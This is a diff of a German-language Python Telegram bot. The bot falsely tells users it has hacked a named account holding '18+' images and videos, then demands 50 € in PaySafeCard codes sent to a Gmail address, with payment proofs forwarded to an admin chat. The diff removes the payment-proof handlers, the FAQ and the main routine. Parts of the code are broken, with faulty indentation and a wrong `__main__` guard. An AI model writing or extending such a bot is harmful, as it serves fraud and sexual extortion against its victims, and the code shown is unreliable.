@@ -111,7 +111,6 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Noch keine Nutzer gespeichert.")
     else:
         await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}")
-
 # ---- HACK ----
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -155,7 +154,7 @@ if not context.args:
     msg_text = (
         f"👾 Wir haben den Benutzer ({username}) gefunden, und das Konto ist angreifbar! 👾\n\n"
         f"👤 {name}\n"
-        f"🖼️ {bilder} Bilder als 18+ getaggt\n"
+        f"🖼 {bilder} Bilder als 18+ getaggt\n"
         f"📹 {videos} Videos als 18+ getaggt\n\n"
         f"💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 50 € mit /pay.\n\n"
         f"👉 Nach der Zahlung erhältst du hier Alles: Mega.nz"
@@ -197,7 +196,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "💳 <b>PaySafeCard</b>\n\n"
             "\n\Email: jessy.kla99@gmail.com."
             "\n\send Beweisfoto an den Bot."
-            "\n\Bitte über Familie, Freunde, sonst Ungültig."
             "\n\Verwendungszweck: Dein Telegram Name."
            f"{info_refund}"
         )
@@ -211,90 +209,3 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
-
-# ---- PHOTO (Beweis) ----
-async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    from_user = update.message.from_user
-if from_user.id in user_proof_sent:
-        await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
-        return
-
-    user_proof_sent.add(from_user.id)
-
-    photo = update.message.photo[-1]
-    caption = update.message.caption or ""
-    forward_text = (
-        f"📸 Neuer Beweis von @{from_user.username or from_user.first_name} (ID: {from_user.id})\n\n"
-        f"Bildunterschrift:\n{caption}"
-    )
-    try:
-        await context.bot.send_photo(
-            chat_id=ADMIN_CHAT_ID,
-            photo=photo.file_id,
-            caption=forward_text,
-            parse_mode=ParseMode.HTML,
-        )
-        await update.message.reply_text("✅ Dein Beweis wurde erfolgreich gesendet!")
-    except Exception as e:
-        print("Fehler beim Senden des Beweisfotos:", e)
-        await update.message.reply_text("❌ Fehler beim Senden des Beweisfotos.")
-
-# ---- TEXT (Paysafe-Code) ----
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip()
-    paysafe_pattern = re.compile(r"^\d{4}-\d{4}-\d{4}-\d{4}$")
-    from_user = update.message.from_user
-
-    if paysafe_pattern.match(text):
-        if from_user.id in user_proof_sent:
-            await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
-            return
-
-        user_proof_sent.add(from_user.id)
-
-        msg = f"🎫 Neuer Paysafe-Code von @{from_user.username or from_user.first_name}:\n<code>{text}</code>"
-        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode=ParseMode.HTML)
-        await update.message.reply_text("✅ Dein Paysafe-Code wurde erfolgreich gesendet!")
-
-# ---- DUMMY INVITE/REDEEM/FAQ ----
-async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = "🎁 Lade Freunde ein und erhalte einen kostenlosen Hack!\n\n🔗 https://t.me/+wf3YFvO0uJM5MGJh"
-    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
-
-async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")
-
-async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    faq_text = (
-        "📖 Häufig gestellte Fragen (FAQ)\n\n"
-        "❓ Wie funktioniert das Ganze?\n"
-        "💬 Gib den Befehl /hack Benutzername ein.\n\n"
-        "❓ Wie lange dauert ein Hack?\n"
-        "💬 In der Regel 3–5 Minuten.\n\n"
-        "❓ Wie bezahle ich?\n"
-        "💬 Mit /pay nach dem Hack."
-    )
-    await update.message.reply_text(faq_text, parse_mode=ParseMode.MARKDOWN)
-
-# ---- MAIN ----
-def main():
-    application = ApplicationBuilder().token(TOKEN).build()
-
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("hack", hack))
-    application.add_handler(CommandHandler("pay", pay))
-    application.add_handler(CommandHandler("invite", invite))
-    application.add_handler(CommandHandler("redeem", redeem))
-    application.add_handler(CommandHandler("faq", faq))
-    application.add_handler(CommandHandler("listusers", list_users))
-
-    application.add_handler(CallbackQueryHandler(button_handler))
-    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-
-    print("✅ Bot läuft...")
-    application.run_polling()
-
-if name == "_main_":
-    keep_alive()
-    main()
